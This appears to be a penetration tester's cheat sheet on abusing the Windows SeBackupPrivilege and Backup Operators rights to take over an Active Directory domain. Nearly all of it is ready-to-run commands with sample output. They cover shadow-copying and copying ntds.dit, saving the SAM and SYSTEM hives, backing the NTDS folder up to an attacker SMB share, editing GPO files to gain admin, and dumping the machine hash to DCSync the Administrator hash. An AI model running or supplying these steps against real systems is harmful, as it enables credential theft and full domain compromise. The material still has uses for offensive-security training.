# SeBackupPrivilege

Exploit with `SeBackupPrivilege`.

# Stable Version

```powershell
mkdir C:\mane

echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append    
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

diskshadow.exe /s c:\mane\diskshadow.txt
```

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSeBackupPrivilege Z:\Windows\NTDS\ntds.dit C:\mane\ntds.dit

reg save HKLM\SYSTEM system
reg save HKLM\SAM sam
```

[DLL Download Link](https://github.com/k4sth4/SeBackupPrivilege)

# More Version

You need to setup NTFS Disk to support remote windows backup.

## 0x0 Pre-setup ntfs

```bash
# Create 2G Disk
dd if=/dev/zero of=ntfs.disk bs=1024M count=2 

# Mount disk
sudo losetup -fP ntfs.disk

# Check Mount 
losetup -a

# format ntfs
sudo mkfs.ntfs /dev/loop0

# Mount 
sudo mount /dev/loop0 smb/

# Check mount
mount | grep smb

```
## 0x1 Install and setup smb

```bash
sudo vim /etc/samba/smb.conf
```

```config

# Comment the following line
# map to guest = bad user

# add config
[mane]
   comment = mane testing
   path = /home/mane/Challenge/smb
   writeable = yes
   guest ok = yes
   read only = no
   valid users = smbuser
   write list = smbuser
   force user = root
```

```bash
# add user
sudo adduser smbuser

# set password
sudo smbpasswd -a smbuser

# restart smb
sudo service smb restart
```

## 0x2 Testing smb share
```bash
$ smbmap -u 'smbuser' -p 'password' -H 127.0.0.1

[+] IP: 127.0.0.1:445   Name: localhost                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        mane                                                    READ, WRITE     mane testing
        print$                                                  READ ONLY       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.19.0-Debian)
        smbuser                                                 READ ONLY       Home Directories

```

## 0x3 Mount remote PC

Cache the smb credential

```cmd
net use M: \\10.10.16.14\mane /user:smbuser password

dir M:\
```

## 0x4 Exploit

```
echo "Y" | wbadmin start backup -backuptarget:\\10.10.16.14\mane -include:c:\windows\ntds

# Look at the backup version
wbadmin get versions

# Restore the version
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

## 0x5 Finally

When Exploit ok, download ntds.dit in `C:\`.

# AD - Change GPO files

You can change `GptTmpl.inf` file, wait GPO Update and got admin, [Details see Here](https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf).

```powershell
# Clear tickets
klist purge

# ask tgt
rubeus.exe asktgt /domain:manesec.local /user:backup /rc4:<backup$ hash> /ptt

# Read file
robocopy "\\DC\SYSVOL\megabank.local\Policies\{xxxxxxxxxxxxxxx}\MACHINE\Microsoft\Windows NT\SecEdit" "." GptTmpl.inf /b

# Write file
robocopy "." "\\DC\SYSVOL\megabank.local\Policies\{xxxxxxxxxxxxxxx}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /b
```

# AD - BackupOperatorToDA

Use this [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) but no stable.

This is same as use `reg.py` dump same into `SYSVOL` and use machine hash to dcsync. 

```
$ reg.py 'backup$'@192.168.24.10 -hashes ":xxxxxxxxxxxxxx" backup -o '\\DC\SYSVOL'   
Impacket v0.13.0.dev0+20241127.154729.af51dfd - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\primary\SYSVOL\SAM.save
[*] Saved HKLM\SYSTEM to \\primary\SYSVOL\SYSTEM.save
[*] Saved HKLM\SECURITY to \\primary\SYSVOL\SECURITY.save

$ smbclient.py 'backup$'@192.168.24.10 -hashes :xxxxxxxxxxxxxx
# use SYSVOL
# ls
drw-rw-rw-          0  Wed Dec  4 15:11:40 2024 .
drw-rw-rw-          0  Wed Dec  4 15:11:40 2024 ..
drw-rw-rw-          0  Tue Jan 28 00:49:17 2020 manesec.com
-rw-rw-rw-      49152  Wed Dec  4 15:11:35 2024 SAM.save
-rw-rw-rw-      36864  Wed Dec  4 15:11:40 2024 SECURITY.save
-rw-rw-rw-   14823424  Wed Dec  4 15:11:38 2024 SYSTEM.save

# Dump machine hash
$ secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save local
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9be2f2d89df4c2ac986eff89010ade94

# Use machine hash to DCsync
$ secretsdump.py PRIMARY\$@192.168.24.10 -hashes ":9be2f2d89df4c2ac986eff89010ade94"
Administrator:500:aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxx:::
```


# Reference

https://rootsecdev.medium.com/abusing-sebackupprivilege-cd5d1a88f992

https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s

https://www.inguardians.com/wp-content/uploads/2020/04/BackupOperators-1.pdf